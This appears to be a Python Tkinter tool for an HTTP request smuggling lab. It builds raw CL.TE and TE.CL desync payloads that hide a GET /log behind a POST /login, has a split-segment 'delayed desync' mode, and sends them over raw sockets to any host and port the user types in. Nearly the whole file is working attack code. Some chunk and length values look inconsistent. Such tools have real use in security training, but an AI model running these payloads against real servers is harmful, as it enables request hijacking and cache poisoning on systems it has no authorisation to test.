import socket
import time
import tkinter as tk
from tkinter import ttk, messagebox

CL_TE_PAYLOAD = (
    "POST /login HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 13\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "d\r\n"
    "username=alice\r\n"
    "0\r\n"
    "\r\n"
    "GET /log HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "\r\n"
)

TE_CL_PAYLOAD = (
    "POST /login HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Content-Length: 4\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "GET /log HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "\r\n"
)

EXPLANATIONS = {
    "CL.TE": "CL.TE – Frontend trusts CL, backend trusts TE",
    "TE.CL": "TE.CL – Frontend trusts TE, backend trusts CL",
    "DELAY": "Delayed desync – body sent in two TCP segments",
}

class SmugglingGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("HTTP Request Smuggling Lab")
        self.geometry("900x750")
        self.build_ui()
        self.update_payload()

    def build_ui(self):
        cfg = ttk.Frame(self)
        cfg.pack(fill="x", padx=10, pady=5)

        ttk.Label(cfg, text="Host").pack(side="left")
        self.host = ttk.Entry(cfg, width=20)
        self.host.insert(0, "localhost")
        self.host.pack(side="left", padx=5)

        ttk.Label(cfg, text="Port").pack(side="left")
        self.port = ttk.Entry(cfg, width=10)
        self.port.insert(0, "8080")
        self.port.pack(side="left", padx=5)

        ttk.Button(cfg, text="Send", command=self.send).pack(side="right")

        self.mode = tk.StringVar(value="CL.TE")
        for m in ("CL.TE", "TE.CL", "DELAY"):
            ttk.Radiobutton(
                self, text=m, value=m, variable=self.mode,
                command=self.update_payload
            ).pack(anchor="w", padx=20)

        ttk.Label(self, text="Raw HTTP Payload").pack(anchor="w", padx=10)
        self.payload = tk.Text(self, height=16, font=("Courier", 10))
        self.payload.pack(fill="both", expand=True, padx=10)

        ttk.Label(self, text="Response").pack(anchor="w", padx=10)
        self.response = tk.Text(self, height=16, font=("Courier", 10), bg="black", fg="lime")
        self.response.pack(fill="both", expand=True, padx=10)

    def update_payload(self):
        self.payload.delete("1.0", "end")
        if self.mode.get() == "CL.TE":
            self.payload.insert("end", CL_TE_PAYLOAD)
        elif self.mode.get() == "TE.CL":
            self.payload.insert("end", TE_CL_PAYLOAD)
        else:
            self.payload.insert("end", CL_TE_PAYLOAD)

    def send(self):
        host = self.host.get()
        port = int(self.port.get())
        raw = self.payload.get("1.0", "end").encode()

        self.response.delete("1.0", "end")

        try:
            with socket.create_connection((host, port), timeout=5) as s:
                if self.mode.get() == "DELAY":
                    head, body = raw.split(b"\r\n\r\n", 1)
                    s.sendall(head + b"\r\n\r\n")
                    time.sleep(1.5)
                    s.sendall(body)
                else:
                    s.sendall(raw)

                s.settimeout(2)
                while True:
                    try:
                        data = s.recv(4096)
                        if not data:
                            break
                        self.response.insert("end", data.decode(errors="replace"))
                    except socket.timeout:
                        break

        except Exception as e:
            messagebox.showerror("Error", str(e))

if __name__ == "__main__":
    SmugglingGUI().mainloop()
